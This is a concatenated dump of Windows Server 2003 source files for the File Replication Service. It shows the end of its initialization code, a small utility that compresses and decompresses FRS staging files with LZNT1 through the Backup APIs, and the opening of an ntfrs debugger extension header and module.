    CfgRegReadDWord(FKC_STAGING_LIMIT, NULL, 0, &StagingLimitInKb);
    DPRINT1(4, ":S: Staging limit is: %d KB\n", StagingLimitInKb);

    //
    // Put the default value in registry if there is no key present.
    //
    CfgRegWriteDWord(FKC_STAGING_LIMIT,
                     NULL,
                     FRS_RKF_FORCE_DEFAULT_VALUE | FRS_RKF_KEEP_EXISTING_VALUE,
                     0);

    //
    // Get Max number of replica sets allowed.
    //
    CfgRegReadDWord(FKC_MAX_NUMBER_REPLICA_SETS, NULL, 0, &MaxNumberReplicaSets);

    //
    // Get outstanding CO qutoa limit on outbound connections.
    //
    CfgRegReadDWord(FKC_OUT_LOG_CO_QUOTA, NULL, 0, &MaxOutLogCoQuota);

    //
    // Get boolean to tell us to preserve file object IDs
    //  -- See Bug 352250 for why this is a risky thing to do.
    CfgRegReadDWord(FKC_PRESERVE_FILE_OID, NULL, 0, &PreserveFileOID);

    //
    // Get the service long name for use in error messages.
    //
    ServiceLongName = FrsGetResourceStr(IDS_SERVICE_LONG_NAME);

    //
    // Initialize the Delayed command server. This command server
    // is really a timeout queue that the other command servers use
    // to retry or check the state of previously issued commands that
    // have an indeterminate completion time.
    //
    // WARN: MUST BE FIRST -- Some command servers may use this
    // command server during their initialization.
    //
    WaitInitialize();
    FrsDelCsInitialize();

    //
    // SETUP THE COMM LAYER
    //

    //
    // Initialize the low level comm subsystem
    //
    CommInitializeCommSubsystem();

    //
    // Initialize the Send command server. The receive command server
    // starts when we register our RPC interface.
    //
    SndCsInitialize();

    //
    // SETUP THE SUPPORT COMMAND SERVERS
    //

    //
    // Staging file fetcher
    //
    FrsFetchCsInitialize();

    //
    // Staging file installer
    //
    FrsInstallCsInitialize();

    //
    // Staging file generator
    //
    FrsStageCsInitialize();

    //
    // outbound log processor
    //
    OutLogInitialize();

    //
    // LAST, KICK OFF REPLICATION
    //

    //
    // MUST PRECEED DATABASE AND DS INITIALIZATION
    //
    // The DS command server and the Database command server depend on
    // the replica control initialization.
    //
    // Initialize the replica control command server
    //
    RcsInitializeReplicaCmdServer();

    //
    // Actually, we can start the database at any time after the delayed
    // command server and the replica control command server. But its
    // a good idea to fail sooner than later to make cleanup more predictable.
    //
    DbsInitialize();

    //
    // Free up memory by reducing our working set size
    //
    SetProcessWorkingSetSize(ProcessHandle, (SIZE_T)-1, (SIZE_T)-1);

    MainInitHasRun = TRUE;
    LeaveCriticalSection(&MainInitLock);
}

////////////////////////////////////FROM MAIN.C////////////////////////////////////


#define FREE(_p) \
if (_p) free(_p);


PWCHAR *
MainConvertArgV(
    DWORD ArgC,
    PCHAR *ArgV
    )
/*++
Routine Description:
    Convert short char ArgV into wide char ArgV

Arguments:
    ArgC    - From main
    ArgV    - From main

Return Value:
    Address of the new ArgV
--*/
{
#undef DEBSUB
#define DEBSUB "MainConvertArgV:"

    PWCHAR  *wideArgV;

    wideArgV = (PWCHAR*)malloc((ArgC + 1) * sizeof(PWCHAR));
    wideArgV[ArgC] = NULL;

    while (ArgC-- >= 1) {
        wideArgV[ArgC] = (PWCHAR)malloc((strlen(ArgV[ArgC]) + 1) * sizeof(WCHAR));
        wsprintf(wideArgV[ArgC], L"%hs", ArgV[ArgC]);

        if (wideArgV[ArgC]) {
            _wcslwr(wideArgV[ArgC]);
        }
    }
    return wideArgV;
}

#define STAGEING_IOSIZE  (64 * 1024)

DWORD
FrsGetReparseTag(
    IN  HANDLE  Handle,
    OUT ULONG   *ReparseTag
    );


BOOL CompressionEnabled = TRUE;
//
//  Local data structures
//

//
//  The compressed chunk header is the structure that starts every
//  new chunk in the compressed data stream.  In our definition here
//  we union it with a ushort to make setting and retrieving the chunk
//  header easier.  The header stores the size of the compressed chunk,
//  its signature, and if the data stored in the chunk is compressed or
//  not.
//
//  Compressed Chunk Size:
//
//      The actual size of a compressed chunk ranges from 4 bytes (2 byte
//      header, 1 flag byte, and 1 literal byte) to 4098 bytes (2 byte
//      header, and 4096 bytes of uncompressed data).  The size is encoded
//      in a 12 bit field biased by 3.  A value of 1 corresponds to a chunk
//      size of 4, 2 => 5, ..., 4095 => 4098.  A value of zero is special
//      because it denotes the ending chunk header.
//
//  Chunk Signature:
//
//      The only valid signature value is 3.  This denotes a 4KB uncompressed
//      chunk using with the 4/12 to 12/4 sliding offset/length encoding.
//
//  Is Chunk Compressed:
//
//      If the data in the chunk is compressed this field is 1 otherwise
//      the data is uncompressed and this field is 0.
//
//  The ending chunk header in a compressed buffer contains the a value of
//  zero (space permitting).
//

typedef union _COMPRESSED_CHUNK_HEADER {

    struct {

        USHORT CompressedChunkSizeMinus3 : 12;
        USHORT ChunkSignature            :  3;
        USHORT IsChunkCompressed         :  1;

    } Chunk;

    USHORT Short;

} COMPRESSED_CHUNK_HEADER, *PCOMPRESSED_CHUNK_HEADER;

#define FRS_MAX_CHUNKS_TOUNCOMPRESS 16


DWORD
StuNewGenerateStage(
    PWCHAR  SrcFile,
    PWCHAR  DestFile
    )
/*++
Routine Description:
    Create and populate the staging file.  Currently there are four cases
    of interest based on the state of Coe, FromPreExisting and Md5:

    Coe   FromPreExisting  Md5

    NULL     FALSE       NULL         Fetch on demand or outlog trimmed so stage file must be regenerated
    NULL     FALSE       non-null     Fetch of pre-existing file by downstream partner.  check MD5.
    NULL     TRUE        NULL         doesn't occur
    NULL     TRUE        non-null     doesn't occur
    non-NULL FALSE       NULL         Generate stage file for local CO
    non-NULL FALSE       non-null     doesn't occur -- MD5 only generated for preexisting files
    non-NULL TRUE        NULL         doesn't occur -- MD5 always generated for preexisting files.
    non-NULL TRUE        non-null     Generate stage file from pre-existing file and send MD5 upstream to check for a match.

Arguments:

    Coc -- ptr to change order command.  NULL on incoming fetch requests from downstream partners.

    Coe -- ptr to change order entry.  NULL when regenerating the staging file for fetch

    FromPreExisting -- TRUE if this staging file is being generated from a
                       preexisting file.

    Md5 -- Generate the MD5 digest for the caller and return it if Non-NULL

    SizeOfFileGenerated - Valid when the size generated is needed, otherwise NULL

Return Value:
    WIN32 STATUS

--*/
{
#undef DEBSUB
#define DEBSUB  "StuNewGenerateStage:"


    OVERLAPPED      OpLockOverLap;
    LONGLONG        StreamBytesLeft;
    LONG            BuffBytesLeft;


    DWORD           WStatus;
    DWORD           NumBackupDataBytes;
    ULONG           ReparseTag;
    ULONG           OpenOptions;
    WORD            OldSecurityControl;
    WORD            NewSecurityControl;
    WORD            *SecurityControl;
    BOOL            FirstBuffer     = TRUE;
    BOOL            Regenerating    = FALSE;
    BOOL            SkipCo          = FALSE;
    BOOL            FirstOpen       = TRUE;
    BOOL            StartOfStream   = TRUE;

    PWCHAR          StagePath       = NULL;
    PWCHAR          FinalPath       = NULL;
    PUCHAR          BackupBuf       = NULL;
    PVOID           BackupContext   = NULL;

    HANDLE          OpLockEvent     = NULL;
    HANDLE          SrcHandle       = INVALID_HANDLE_VALUE;
    HANDLE          StageHandle     = INVALID_HANDLE_VALUE;
    HANDLE          OpLockHandle    = INVALID_HANDLE_VALUE;

    WIN32_STREAM_ID *StreamId;

    PSTAGE_HEADER   Header          = NULL;
    STAGE_HEADER    StageHeaderMemory;
    ULONG           Length;
    PREPLICA        NewReplica      = NULL;
    WCHAR           TStr[100];

    DWORD           NtStatus;
    PUCHAR          CompressedBuf   = NULL;
    DWORD           CompressedSize;
    PVOID           WorkSpace       = NULL;
    DWORD           WorkSpaceSize   = 0;
    DWORD           FragmentWorkSpaceSize   = 0;
    DWORD           UnCompressedFileSize    = 0;
    DWORD           CompressedFileSize      = 0;

    OpenOptions = OPEN_OPTIONS;

    //
    // The header is located at the beginning of the newly created staging file
    //
    // Fill in the header with info from the src file
    //      Compression type
    //      Change order
    //      Attributes
    //
    Header = &StageHeaderMemory;
    ZeroMemory(Header, sizeof(STAGE_HEADER));

    Header->Attributes.FileAttributes = GetFileAttributes(SrcFile);

RETRY_OPEN:

    WStatus = FrsOpenSourceFileW(&SrcHandle,
                                    SrcFile,
                                    READ_ACCESS,
                                    OpenOptions);
    if (!WIN_SUCCESS(WStatus)) {
        goto out;
    }

    //
    // What type of reparse is it?
    //
    if (FirstOpen &&
        (Header->Attributes.FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
        FirstOpen = FALSE;

        //
        // reparse tag
        //
        WStatus = FrsGetReparseTag(SrcHandle, &ReparseTag);
        if (!WIN_SUCCESS(WStatus)) {
            goto out;
        }

        //
        // We only accept operations on files with SIS and HSM reparse points.
        // For example a rename of a SIS file into a replica tree needs to prop
        // a create CO.
        //
        if ((ReparseTag != IO_REPARSE_TAG_HSM) &&
            (ReparseTag != IO_REPARSE_TAG_SIS)) {

            WIN_SET_FAIL(WStatus);
            goto out;
        }

        //
        // We hit a file with a known reparse tag type.
        // Close and reopen the file without the FILE_OPEN_REPARSE_POINT
        // option so backup read will get the underlying data.
        //
        FRS_CLOSE(SrcHandle);

        ClearFlag(OpenOptions, FILE_OPEN_REPARSE_POINT);
        goto RETRY_OPEN;

    }


    //
    // Assume retriable errors for the silly boolean functions
    //
    WIN_SET_RETRY(WStatus);

    //
    // Default to no compression if we can't get the compression state
    //
    if (!FrsGetCompression(SrcFile, SrcHandle, &Header->Compression)) {
        Header->Compression = COMPRESSION_FORMAT_NONE;
    }

    //
    // The backup data begins at the first 32 byte boundary following the header
    //
    Header->DataLow = QuadQuadAlignSize(sizeof(STAGE_HEADER));

    //
    // Major/minor
    //
    Header->Major = NtFrsStageMajor;
    Header->Minor = NtFrsStageMinor;

    //
    // Create the local staging name
    //
    StagePath = FrsWcsDup(DestFile);

    //
    // Create the staging file
    //
    WStatus = StuCreateFile(StagePath,&StageHandle);
    if (!WIN_SUCCESS(WStatus) || !HANDLE_IS_VALID(StageHandle)) {
        goto out;
    }

    //
    // Approximate size of the staging file
    //
    WStatus = FrsSetFilePointer(StagePath, StageHandle,
				Header->Attributes.EndOfFile.HighPart,
				Header->Attributes.EndOfFile.LowPart);
    if(!WIN_SUCCESS(WStatus)) {
        goto out;
    }


    WStatus = FrsSetEndOfFile(StagePath, StageHandle);

    if(!WIN_SUCCESS(WStatus)) {
        goto out;
    }
    //
    // Rewind the file, write the header, and set the file pointer
    // to the next 32 byte boundary
    //
    WStatus = FrsSetFilePointer(StagePath, StageHandle, 0, 0);

    if(!WIN_SUCCESS(WStatus)) {
        goto out;
    }
    
    WStatus = StuWriteFile(StagePath, StageHandle, Header, sizeof(STAGE_HEADER));

    if(!WIN_SUCCESS(WStatus)) {
        goto out;
    }
    
    WStatus = FrsSetFilePointer(StagePath, StageHandle, 0, Header->DataLow);

    if(!WIN_SUCCESS(WStatus)) {
        goto out;
    }

    UnCompressedFileSize = Header->DataLow;
    CompressedFileSize = Header->DataLow;

    //
    // Backup the src file into the staging file
    //
    BackupBuf = FrsAlloc(STAGEING_IOSIZE);
    CompressedBuf = FrsAlloc(STAGEING_IOSIZE * 2);
    StreamBytesLeft = 0;

    NtStatus = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1,
                                              &WorkSpaceSize,
                                              &FragmentWorkSpaceSize);

    WStatus = FrsSetLastNTError(NtStatus);

    if (!WIN_SUCCESS(WStatus)) {
        goto out;
    }
//    printf("WorkSpaceSize = %d, FragmentWorkSpaceSize = %d\n", WorkSpaceSize, FragmentWorkSpaceSize);

    WorkSpace = FrsAlloc(WorkSpaceSize);

    while (TRUE) {
        //
        // read source
        //
        if (!BackupRead(SrcHandle,
                        BackupBuf,
                        STAGEING_IOSIZE,
                        &NumBackupDataBytes,
                        FALSE,
                        TRUE,
                        &BackupContext)) {
            goto out;
        }

        //
        // No more data; Backup done
        //
        if (NumBackupDataBytes == 0) {
            break;
        }

        UnCompressedFileSize += NumBackupDataBytes;

        //
        // write the staging file
        //

        NtStatus = RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1,           //  compression engine
                                     BackupBuf,                          //  input
                                     NumBackupDataBytes,                 //  length of input
                                     CompressedBuf,                      //  output
                                     STAGEING_IOSIZE * 2,                    //  length of output
                                     4096,                               //  chunking that occurs in buffer
                                     &CompressedSize,                    //  result size
                                     WorkSpace);                         //  I have no clue

        //
        // STATUS_BUFFER_ALL_ZEROS means the compression worked without a hitch
        // and in addition the input buffer was all zeros.
        //
        if (NtStatus == STATUS_BUFFER_ALL_ZEROS) {
            NtStatus = STATUS_SUCCESS;
        }
        WStatus = FrsSetLastNTError(NtStatus);

//        printf("Original Size = %d :: Compressed Size = %d\n", NumBackupDataBytes, CompressedSize);

        if (!WIN_SUCCESS(WStatus)) {
        printf("Error : Original Size = %d :: Compressed Size = %d\n", NumBackupDataBytes, CompressedSize);
            goto out;
        }

//        printf("Original Size = %d :: Compressed Size = %d\n", NumBackupDataBytes, CompressedSize);

        CompressedFileSize += CompressedSize;

	WStatus = StuWriteFile(StagePath, StageHandle, CompressedBuf, CompressedSize);
        if (!WIN_SUCCESS(WStatus)) {
//        if (!StuWriteFile(StagePath, StageHandle, BackupBuf, NumBackupDataBytes)) {
            goto out;
        }

    }

    //
    // Release handles as soon as possible
    //
    FRS_CLOSE(SrcHandle);

    //
    // Make sure all of the data is on disk. We don't want to lose
    // it across reboots
    //
    WStatus = FrsFlushFile(StagePath, StageHandle);
    if (!WIN_SUCCESS(WStatus)) {
        goto out;
    }

    //
    // Done with the staging file handle
    //
    if (BackupContext) {
        BackupRead(StageHandle, NULL, 0, NULL, TRUE, TRUE, &BackupContext);
    }

    FRS_CLOSE(StageHandle);
    BackupContext = NULL;


    printf("%ws Orig= %d, Comp= %d, Percentage_Comp= %5.2f\n", SrcFile, UnCompressedFileSize, CompressedFileSize,
           ((UnCompressedFileSize - CompressedFileSize)/(float)UnCompressedFileSize) * 100);

    WStatus = ERROR_SUCCESS;

out:
    //
    // Release resources
    //
    FRS_CLOSE(SrcHandle);

    if (BackupContext) {
        BackupRead(StageHandle, NULL, 0, NULL, TRUE, TRUE, &BackupContext);
    }

    FRS_CLOSE(StageHandle);

    FrsFree(BackupBuf);
    FrsFree(CompressedBuf);
    FrsFree(WorkSpace);
    FrsFree(StagePath);
    FrsFree(FinalPath);

    return WStatus;
}


ULONG
StuNewExecuteInstall(
    IN PWCHAR   SrcFile,
    IN PWCHAR   DestFile
    )
/*++
Routine Description:
    Install a staging file by restoring it to a temporary file in the
    same directory as the file to be replaced and then renaming it
    to its final destination.

Arguments:
    Coe

Return Value:

    Win32 status -
    ERROR_SUCCESS -  All installed or aborted. Don't retry.
    ERROR_GEN_FAILURE - Couldn't install bag it.
    ERROR_SHARING_VIOLATION - Couldn't open the target file.  retry later.
    ERROR_DISK_FULL - Couldn't allocate the target file.  retry later.
    ERROR_HANDLE_DISK_FULL - ?? retry later.

--*/
{
#undef DEBSUB
#define DEBSUB  "StuNewExecuteInstall:"
    DWORD           WStatus;
    DWORD           BytesRead;
    ULONG           Restored;
    ULONG           ToRestore;
    ULONG           High;
    ULONG           Low;
    ULONG           Flags;
    BOOL            AttributeMissmatch;
    ULONG           CreateDisposition;
    ULONG           OpenOptions;
    BOOL            IsDir;
    BOOL            IsReparsePoint;
    ULONG           SizeHigh;
    ULONG           SizeLow;
    BOOL            ExistingOid;
    PVOID           RestoreContext       = NULL;
    PWCHAR          StagePath            = NULL;
    PSTAGE_HEADER   Header               = NULL;
    HANDLE          DstHandle            = INVALID_HANDLE_VALUE;
    HANDLE          StageHandle          = INVALID_HANDLE_VALUE;
    PUCHAR          RestoreBuf           = NULL;
    FILE_OBJECTID_BUFFER    FileObjID;
    STAGE_HEADER    StageHeaderMemory;

    DWORD           NtStatus;
    PUCHAR          UnCompressedBuf      = NULL;
    DWORD           UnCompressedBufLen   = 0;
    DWORD           ActUnCompressedSize  = 0;
    COMPRESSED_CHUNK_HEADER ChunkHeader;
    DWORD           RestoreBufIndex      = 0;
    DWORD           RestoreBufSize       = 0;
    LONG            LenOfPartialChunk    = 0;
    DWORD           NoOfChunks           = 0;


    //
    // PROCESS STAGING FILE
    //
    StagePath = FrsWcsDup(SrcFile);

    //
    // Open the stage file for shared, sequential reads
    //
    WStatus = StuOpenFile(StagePath, GENERIC_READ,&StageHandle);
    if (!WIN_SUCCESS(WStatus) || !HANDLE_IS_VALID(StageHandle)) {
        goto CLEANUP;
    }

    //
    // Read the header
    //
    Header = &StageHeaderMemory;
    ZeroMemory(Header, sizeof(STAGE_HEADER));

    WStatus = StuReadFile(StagePath, StageHandle, Header, sizeof(STAGE_HEADER), &BytesRead);
    if (!WIN_SUCCESS(WStatus)) {
        printf("Can't read file %ws. Error %d\n", StagePath, WStatus);
    }

    //
    // Don't understand this header format
    //
    if (Header->Major != NtFrsStageMajor) {
        printf("Stage Header Major Version (%d) not supported.  Current Service Version is %d\n",
                Header->Major, NtFrsStageMajor);
        goto CLEANUP;
    }

    //
    // Minor version NTFRS_STAGE_MINOR_1 had the change order extension in the
    // header.
    //
/*    if (Header->Minor >= NTFRS_STAGE_MINOR_0) {

    } else {
        //
        // This is an older stage file.  No CO Extension in the header.
        //
        Header->ChangeOrderCommand.Extension = NULL;
    }
*/
    //
    // PROCESS TEMPORARY FILE
    //
    IsDir = Header->Attributes.FileAttributes & FILE_ATTRIBUTE_DIRECTORY;
    IsReparsePoint = Header->Attributes.FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT;

    CreateDisposition = FILE_OPEN;
    if (!IsDir) {
        //
        // In case this is an HSM file don't force the data to be read from
        // tape since the remote co is just going to overwrite all the data anyway.
        //
        // Setting CreateDisposition to FILE_OVERWRITE seems to cause a regression
        // Failure with an ACL Test where we set a deny all ACL and then the
        // open fails.  This is a mystery for now so don't do it.
        // In addtion overwrite fails if RO attribute is set on file.
        //
        //CreateDisposition = FILE_OVERWRITE;
        printf("Target is a file\n");
    } else {
        printf("Target is a directory\n");
    }

    //
    // In case this is a SIS or HSM file open the underlying file not the
    // reparse point.  For HSM, need to clear FILE_OPEN_NO_RECALL to write it.
    //
    OpenOptions = OPEN_OPTIONS;

    WStatus = StuCreateFile(DestFile,&DstHandle);
    if (!WIN_SUCCESS(WStatus) || !HANDLE_IS_VALID(DstHandle)) {
        goto CLEANUP;
    }

    //
    // Truncate the file if not a directory
    //
    if (!IsDir && !SetEndOfFile(DstHandle)) {
        printf("++ WARN - SetEndOfFile(%ws);", DestFile, GetLastError());
    }

    //
    // For the silly functions that don't return a win status
    //
    WIN_SET_FAIL(WStatus);

    //
    // Set compression mode
    //
    WStatus = FrsSetCompression(DestFile, DstHandle, Header->Compression);
    if (!WIN_SUCCESS(WStatus)) {
        goto CLEANUP;
    }
    //
    // Set attributes
    //
    WStatus = FrsSetFileAttributes(DestFile,
				   DstHandle,
				   Header->Attributes.FileAttributes &
				   ~NOREPL_ATTRIBUTES);
    if (!WIN_SUCCESS(WStatus)) {
        goto CLEANUP;
    }

    //
    // Seek to the first byte of data in the stage file
    //
    WStatus = FrsSetFilePointer(StagePath, StageHandle,
				  Header->DataHigh, Header->DataLow);
    if (!WIN_SUCCESS(WStatus)) {
        goto CLEANUP;
    }

    //
    // Restore the stage file into the temporary file
    //
    RestoreBuf = FrsAlloc(STAGEING_IOSIZE);
    UnCompressedBuf = 0;
    UnCompressedBufLen = 0;

    do {
        //
        // read stage
        //
	WStatus = StuReadFile(StagePath, StageHandle, RestoreBuf, STAGEING_IOSIZE, &ToRestore);
        if (!WIN_SUCCESS(WStatus)) {
            goto CLEANUP;
        }

        if (ToRestore == 0) {
            break;
        }

        RestoreBufIndex = 0;
        RestoreBufSize = 0;
        NoOfChunks = 0;
        while ((RestoreBufIndex <= ToRestore) && (NoOfChunks < FRS_MAX_CHUNKS_TOUNCOMPRESS)) {
            memcpy(&ChunkHeader, RestoreBuf + RestoreBufIndex,sizeof(COMPRESSED_CHUNK_HEADER));
//            printf("Chunck size is 0x%x\n", ChunkHeader.Chunk.CompressedChunkSizeMinus3);
            RestoreBufSize = RestoreBufIndex;
            ++NoOfChunks;
            RestoreBufIndex+=ChunkHeader.Chunk.CompressedChunkSizeMinus3+3;
        }

        //
        // Check if the uncompressed buffer is enough to hold the data.
        // A uncomressed chunk can not be bigger than the chunk size specified
        // during compression (4096)
        //

        if ((NoOfChunks * 4096) > UnCompressedBufLen) {
//            printf("Allocating UnCompressedBuf 0x%x\n", NoOfChunks * 4096);
            UnCompressedBuf = FrsAlloc(NoOfChunks * 4096);
            UnCompressedBufLen = NoOfChunks * 4096;
        }

        //
        // Rewind the file pointer so we can read the remaining chunck at the next read.
        //

        LenOfPartialChunk = ((LONG)RestoreBufSize - (LONG)ToRestore);

        LenOfPartialChunk = SetFilePointer(StageHandle, LenOfPartialChunk, NULL, FILE_CURRENT);

        if (LenOfPartialChunk == 0xFFFFFFFF && GetLastError() != NO_ERROR) {
//            FrsErrorCodeMsg1(FRS_ERROR_SET_FILE_POINTER, GetLastError(), StagePath);
            goto CLEANUP;;
        }

//        printf("Passing : UnCompressedBufLen = 0x%x, RestoreBufSize = 0x%x, NoOfChunks = %d\n",
//                UnCompressedBufLen, RestoreBufSize, NoOfChunks);

        NtStatus = RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,           //  compression engine
                                       UnCompressedBuf,                    //  input
                                       UnCompressedBufLen,                 //  length of input
                                       RestoreBuf,                         //  output
                                       RestoreBufSize,                     //
                                       &ActUnCompressedSize);                 //  result size

        WStatus = FrsSetLastNTError(NtStatus);

        if (!WIN_SUCCESS(WStatus)) {
            printf("Error decompressing at file offset 0x%08x. WStatus = %d. NtStatus = 0x%08x. ActUnCompressedSize = 0x%x\n", LenOfPartialChunk, WStatus, NtStatus, ActUnCompressedSize);
            goto CLEANUP;
        }
//        printf("Decompressed buf size = 0x%x\n", ActUnCompressedSize);
        //
        // restore temporary
        //
//        if (!BackupWrite(DstHandle, RestoreBuf, ToRestore, &Restored, FALSE, TRUE, &RestoreContext)) {
        if (!BackupWrite(DstHandle, UnCompressedBuf, ActUnCompressedSize, &Restored, FALSE, TRUE, &RestoreContext)) {

            WStatus = GetLastError();
            if (IsDir && WIN_ALREADY_EXISTS(WStatus)) {
                printf("++ ERROR - IGNORED for %ws; Directories and Alternate Data Streams!\n",DestFile);
            }
            //
            // Uknown stream header or couldn't apply object id
            //
            if (WStatus == ERROR_INVALID_DATA ||
                WStatus == ERROR_DUP_NAME     ||
                (IsDir && WIN_ALREADY_EXISTS(WStatus))) {
                //
                // Seek to the next stream. Stop if there are none.
                //
                BackupSeek(DstHandle, -1, -1, &Low, &High, &RestoreContext);
                if (Low == 0 && High == 0) {
                    break;
                }
            } else {
                //
                // Unknown error; abort
                //
                goto CLEANUP;
            }
        }
    } while (TRUE);

    //
    // Set times
    //
    WStatus = FrsSetFileTime(DestFile,
                        DstHandle,
                        (PFILETIME)&Header->Attributes.CreationTime.QuadPart,
                        (PFILETIME)&Header->Attributes.LastAccessTime.QuadPart,
                        (PFILETIME)&Header->Attributes.LastWriteTime.QuadPart);
    if (!WIN_SUCCESS(WStatus)) {
        goto CLEANUP;
    }



    //
    // Set final attributes (which could make the file Read Only)
    // Clear the offline attrbute flag since we just wrote the file.
    //
    ClearFlag(Header->Attributes.FileAttributes, FILE_ATTRIBUTE_OFFLINE);
    WStatus = FrsSetFileAttributes(DestFile,
                              DstHandle,
                              Header->Attributes.FileAttributes);
    if (!WIN_SUCCESS(WStatus)) {
        goto CLEANUP;
    }

    //
    // Make sure all of the data is on disk. We don't want to lose
    // it across reboots
    //
    if (!FlushFileBuffers(DstHandle)) {
        goto CLEANUP;
    }


    //
    // Return success
    //
    WStatus = ERROR_SUCCESS;

CLEANUP:
    //
    // Release resources in optimal order
    //
    // Leave the file lying around for a retry operation. We don't want
    // to assign a new fid by deleting and recreating the file -- that
    // would confuse the IDTable.
    //
    //
    // Free up the restore context before we close TmpHandle (just in case)
    //
    if (RestoreContext) {
        BackupWrite(DstHandle, NULL, 0, NULL, TRUE, TRUE, &RestoreContext);
    }
    //
    // Close the Dst handle
    //
    if (HANDLE_IS_VALID(DstHandle)) {
        //
        // Truncate a partial install
        //
        if (!WIN_SUCCESS(WStatus)) {
            if (!IsDir) {
                SizeHigh = 0;
                SizeLow = 0;
                SizeLow = SetFilePointer(DstHandle, SizeLow, &SizeHigh, FILE_BEGIN);

                if (SizeLow == 0xFFFFFFFF && GetLastError() != NO_ERROR) {
                } else if (!SetEndOfFile(DstHandle)) {
                }
            }
        }
        FRS_CLOSE(DstHandle);
    }

    FRS_CLOSE(StageHandle);

    //
    // Free the buffers in descending order by size
    //
    FrsFree(RestoreBuf);
    FrsFree(StagePath);

    //
    // DONE
    //
    return WStatus;
}


DWORD
FrsCompressFile(
    PWCHAR SrcFile,
    PWCHAR DestFile
    )
/*++
Routine Description:
    Compresses the file.

Arguments:
    SrcFile  - Source file.
    DestFile - Destination file.

Return Value:
    WStatus.
--*/
{
    DWORD   WStatus = ERROR_SUCCESS;

    WStatus = StuNewGenerateStage(SrcFile, DestFile);

    if (!WIN_SUCCESS(WStatus)) {
        return WStatus;
    }

    return WStatus;
}


DWORD
FrsDeCompressFile(
    PWCHAR SrcFile,
    PWCHAR DestFile
    )
/*++
Routine Description:
    DeCompresses the file.

Arguments:
    SrcFile  - Source file.
    DestFile - Destination file.

Return Value:
    WStatus.
--*/
{
    DWORD   WStatus = ERROR_SUCCESS;

    WStatus = StuNewExecuteInstall(SrcFile, DestFile);

    if (!WIN_SUCCESS(WStatus)) {
        return WStatus;
    }

    return WStatus;
}


VOID
Usage(
    PWCHAR *Argv
    )
/*++
Routine Description:
    Usage messages.

Arguments:
    None.

Return Value:
    None.
--*/
{
    printf("This tool is used to the compress and decompress files.\n\n");
    printf(" /?                            : This help screen is displayed.\n");
    printf(" /c SourceFile DestinationFile : Compress Source File and write to Destination File.\n");
    printf(" /d SourceFile DestinationFile : DeCompress Source File and write to Destination File.\n");
    fflush(stdout);
}


int
__cdecl main (int argc, char *argv[])
{
    PWCHAR            *Argv             = NULL;
    WCHAR             SrcFile[MAX_PATH];
    WCHAR             DestFile[MAX_PATH];
    DWORD             OptLen            = 0;
    BOOL              bCompress         = FALSE;
    BOOL              bDeCompress       = FALSE;
    int               i;
    DWORD             WStatus           = ERROR_SUCCESS;

    if (argc < 2 ) {
        Usage(Argv);
        return 0;
    }

    Argv = MainConvertArgV(argc,argv);
    for (i = 1; i < argc; ++i) {
        OptLen = wcslen(Argv[i]);
        if (OptLen == 2 &&
            ((wcsstr(Argv[i], L"/?") == Argv[i]) ||
             (wcsstr(Argv[i], L"-?") == Argv[i]))) {
            Usage(Argv);
            return 0;
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/c") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-c") == Argv[i]))) {
            if (i + 2 >= argc) {
                Usage(Argv);
                return 0;
            }
            bCompress = TRUE;
            wcscpy(SrcFile, Argv[i+1]);
            wcscpy(DestFile, Argv[i+2]);
            i+=2;
        } else if (OptLen == 2 &&
                ((wcsstr(Argv[i], L"/d") == Argv[i]) ||
                 (wcsstr(Argv[i], L"-d") == Argv[i]))) {
            if (i + 2 >= argc) {
                Usage(Argv);
                return 0;
            }
            bDeCompress = TRUE;
            wcscpy(SrcFile, Argv[i+1]);
            wcscpy(DestFile, Argv[i+2]);
            i+=2;
        } else {
            Usage(Argv);
            return 0;
        }
    }

    DebugInfo.Disabled = TRUE;

    if ((bCompress & bDeCompress) || (!bCompress & !bDeCompress)) {
        Usage(Argv);
        return 0;
    }

    if (bCompress) {
        WStatus = FrsCompressFile(SrcFile, DestFile);
        if (WStatus != ERROR_SUCCESS) {
            printf("Error compressing file %ws. WStatus = %d\n",SrcFile, WStatus);
            return 1;
        }
    } else if (bDeCompress) {
        WStatus = FrsDeCompressFile(SrcFile, DestFile);
        if (WStatus != ERROR_SUCCESS) {
            printf("Error decompressing file %ws. WStatus = %d\n",SrcFile, WStatus);
            return 1;
        }
    }
    return 0;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\frsexts\frsexts.h ===
/*++

    Copyright (c) 1997 Microsoft Corporation

    Module Name:

        frsexts.h

    Abstract:

        Macros for ntfrs debugger extension.

    Author:

        Sudarshan Chitre (sudarc)

    Revision History:

        Sudarc  12-May 1999

--*/

#ifndef _FRSEXTS_H_
#define _FRSEXTS_H_

#include <ntreppch.h>
#include <frs.h>
#include <wdbgexts.h>
#include <ntverp.h>

#define MY_DECLARE_API(_x_) \
    DECLARE_API( _x_ )\
    {\
    ULONG_PTR dwAddr;\
    INIT_DPRINTF();\
    dwAddr = GetExpression(lpArgumentString);\
    if ( !dwAddr ) {\
        dprintf("Error: Failure to get address\n");\
        return;\
    }\
    do_##_x_(dwAddr);\
    return;}

#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\frsexts\frsexts.cxx ===
/*++

Module Name:

    frsexts.cxx

Abstract:



Author:

    Sudarshan Chitre (sudarc)  12-May-1999

Revision History:

     12-May-1999     sudarc


--*/
#include "frsexts.h"
WINDBG_EXTENSION_APIS ExtensionApis;
HANDLE ProcessHandle = 0;
BOOL fKD = 0;

#define MAX_ARGS 4


//
// stuff not common to kernel-mode and user-mode DLLs
//
#undef DECLARE_API

#define DECLARE_API(s)                              \
        VOID                                        \
        s(                                          \
            HANDLE               hCurrentProcess,   \
            HANDLE               hCurrentThread,    \
            DWORD                dwCurrentPc,       \
            PWINDBG_EXTENSION_APIS pExtensionApis,  \
            LPSTR                lpArgumentString   \
            )

#define INIT_DPRINTF()    { if (!fKD) ExtensionApis = *pExtensionApis; ProcessHandle = hCurrentProcess; }
#define MIN(x, y) ((x) < (y)) ? x:y

// define our own operators new and delete, so that we do not have to include the crt

void * __cdecl
::operator new(size_t dwBytes)
{
    void *p;
